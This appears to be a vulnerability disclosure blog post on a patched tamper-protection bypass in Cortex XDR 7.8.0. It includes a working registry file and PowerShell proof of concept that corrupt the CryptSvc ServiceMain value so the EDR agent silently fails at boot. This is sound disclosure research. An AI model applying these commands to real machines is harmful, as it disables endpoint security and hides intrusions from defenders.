# Bypassing Cortex XDR (PAN-SA-2022-0005)

This post details a tamper-protection bypass in Palo Alto Networks Cortex XDR Agent version 7.8.0. An attacker with administrative access to a protected endpoint can modify a single registry value belonging to the Windows Cryptographic Services (`CryptSvc`) service, causing the service to fail to start at the next boot. Because Cortex XDR has a hard runtime dependency on `CryptSvc`, the agent is rendered inoperable without triggering any tamper-protection event.

The vulnerability was reported to Palo Alto Networks PSIRT on September 30, 2022, and patched on December 14, 2022 in advisory [PAN-SA-2022-0005](https://security.paloaltonetworks.com/PAN-SA-2022-0005).

## Background

### Tamper Protection

Tamper protection is a defensive control designed to prevent an attacker, even one with administrative privileges on the host, from disabling or altering the security agent. In the context of EDR, this includes protecting agent binaries, services, registry configuration, and policy state from unauthorized modification.

### Related Prior Research

A related issue was documented by Palo Alto Networks in [PAN-SA-2022-0002](https://security.paloaltonetworks.com/PAN-SA-2022-0002), which concerned modification of the `ServiceDLL` value used by Cortex XDR's dependency on `CryptSvc`. The fix for PAN-SA-2022-0002 added protection on `ServiceDLL` itself. Attempts to modify `ServiceDLL` on version 7.8.0 are blocked, as expected.

![Attempted ServiceDLL modification is blocked](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*ClfiwhwPsa4TuuI8.png)

## Technical Analysis

### Dependency on Cryptographic Services

Cortex XDR relies on Windows Cryptographic Services (`CryptSvc`) for core functionality. If `CryptSvc` is unavailable at boot, the agent does not reach a fully protected state.

![CryptSvc as a dependency](https://miro.medium.com/v2/resize:fit:750/format:webp/0*fIcRPqDTSZ0-5zav.png)

### Service Entry Point Resolution

Windows shared-process services are configured through values stored under the service's `Parameters` subkey. The key values are:

- `ServiceDll` - path to the DLL implementing the service
- `ServiceMain` - name of the exported entry-point function the Service Control Manager invokes when starting the service

Inspecting `cryptsvc.dll` in DLL Export Viewer confirms the exported entry point is `CryptServiceMain`, matching the value stored in the registry:

```text
HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters\ServiceMain
```

![Exported entry point in cryptsvc.dll](https://miro.medium.com/v2/resize:fit:786/format:webp/0*umDdKkvre1Il_5IC.png)

### Bypass Condition

On Cortex XDR 7.8.0, tamper protection covers the `ServiceDll` value but does not cover the sibling `ServiceMain` value in the same `Parameters` key. Overwriting `ServiceMain` with a string that does not correspond to a valid export in `cryptsvc.dll` causes the Service Control Manager to fail to resolve the entry point. At the next boot, `CryptSvc` cannot start, and the Cortex XDR agent fails to initialize along with it.

## Proof of Concept

The following modifications are accepted by the host with tamper protection enabled and no event generated by the agent.

### Registry File

```reg
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters]
"ServiceDllUnloadOnStop"=dword:1
"ServiceMain"="CryptServiceMain_Disable_Cortex"
```

### PowerShell

```powershell
$registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters"
New-ItemProperty -Path $registryPath -Name "ServiceDllUnloadOnStop" -PropertyType DWord -Value 1
New-ItemProperty -Path $registryPath -Name "ServiceMain" -PropertyType String -Value "CryptServiceMain_Disable_Cortex"
```

### Execution

Writing the values succeeds without intervention from Cortex XDR:

![Registry modification executed](https://miro.medium.com/v2/resize:fit:640/format:webp/0*Aq6u5OQftShhiCIf.png)

The values are persisted:

![Modified ServiceMain value](https://miro.medium.com/v2/resize:fit:786/format:webp/0*dR3uFArY3DJHvZp1.png)

After a reboot, `CryptSvc` fails to start because the configured entry point does not exist in `cryptsvc.dll`. Cortex XDR does not initialize:

![Cortex XDR reports as not running](https://miro.medium.com/v2/resize:fit:750/format:webp/0*U4Yf2l-ffKkev9_W.png)

## Impact

A local administrator, or any process executing with sufficient privileges to write to `HKLM\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters`, can disable Cortex XDR on the next boot. The modification produces no tamper-protection event, meaning both the local agent and any centrally managed telemetry remain silent. This undermines the assumption that tamper protection prevents administrative disablement of the sensor, which is a baseline expectation of the control.
